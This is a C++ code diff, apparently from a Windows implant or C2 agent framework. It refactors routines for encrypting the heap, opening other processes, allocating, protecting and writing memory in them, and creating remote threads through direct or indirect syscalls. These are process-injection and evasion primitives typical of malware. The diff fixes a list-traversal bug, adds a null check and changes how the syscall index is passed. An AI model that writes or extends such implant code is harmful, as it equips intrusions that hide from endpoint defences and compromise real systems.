@@ -19,6 +19,8 @@ auto DECLFN Heap::Crypt( VOID ) -> VOID {
                 Key, sizeof( Key ) 
             );
         }
+
+        Current = Current->Next;
     }
 }
 
@@ -79,8 +81,11 @@ auto DECLFN Heap::Free(
 
     while ( Current ) {
         if ( Current->Block == Block ) {
-            Mem::Zero( U_PTR( Current->Block ), Current->Size );
-            Result = Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current->Block );
+
+            if ( Current->Block ) {
+                Mem::Zero( U_PTR( Current->Block ), Current->Size );
+                Result = Self->Ntdll.RtlFreeHeap( C_PTR( Self->Session.HeapHandle ), 0, Current->Block );
+            }
 
             if ( Previous ) {
                 Previous->Next = Current->Next;
@@ -185,7 +190,8 @@ auto DECLFN Process::Open(
         OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
         CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
 
-        Status = Self->Sys->Run( syOpenProc, &Handle, RightsAccess, &ClientID );
+        Self->Sys->Index = syOpenProc;
+        Status = Self->Sys->Run( &Handle, RightsAccess, &ClientID );
         Self->Ntdll.RtlNtStatusToDosError( Status );
     } else {
         Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
@@ -347,7 +353,8 @@ auto DECLFN Thread::Create(
 
         if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) ProcessHandle = NtCurrentProcess();
 
-        Status = Self->Sys->Run( syCrThread, &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
+        Self->Sys->Index = syCrThread;
+        Status = Self->Sys->Run( &Handle, THREAD_ALL_ACCESS, 0, ProcessHandle, StartAddress, Parameter, Flags, 0, StackSize, StackSize, NULL );
         Self->Usf->NtStatusToError( Status );
     } else {
         if ( ProcessHandle ) {
@@ -393,7 +400,9 @@ auto DECLFN Memory::Alloc(
 
         if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
 
-        Status = Self->Sys->Run( syAlloc, Handle, &TmpPtr, 0, &Size, AllocType, Protect );
+        Self->Sys->Index = syAlloc;
+        Status = Self->Sys->Run( Handle, &TmpPtr, 0, &Size, AllocType, Protect );
+        
         BaseAddress = TmpPtr;
         Self->Usf->NtStatusToError( Status );
     } else {
@@ -421,7 +430,8 @@ auto DECLFN Memory::Protect(
 
         if ( Handle == INVALID_HANDLE_VALUE || !Handle ) Handle = NtCurrentProcess();
 
-        Status = Self->Sys->Run( syProtect, Handle, Handle, Base, Size, NewProt, OldProt );
+        Self->Sys->Index = syProtect;
+        Status = Self->Sys->Run( Handle, Handle, Base, Size, NewProt, OldProt );
         Self->Usf->NtStatusToError( Status );
 
         if   ( Status == STATUS_SUCCESS ) Success = TRUE;
@@ -449,7 +459,8 @@ auto DECLFN Memory::Write(
     if ( Self->Sys->Enabled ) {
         NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-        Status = Self->Sys->Run( syWrite, Handle, Base, Buffer, Size, &Written );
+        Self->Sys->Index = syWrite;
+        Status = Self->Sys->Run( Handle, Base, Buffer, Size, &Written );
         Self->Usf->NtStatusToError( Status );
 
         if   ( Status == STATUS_SUCCESS ) Success = TRUE;
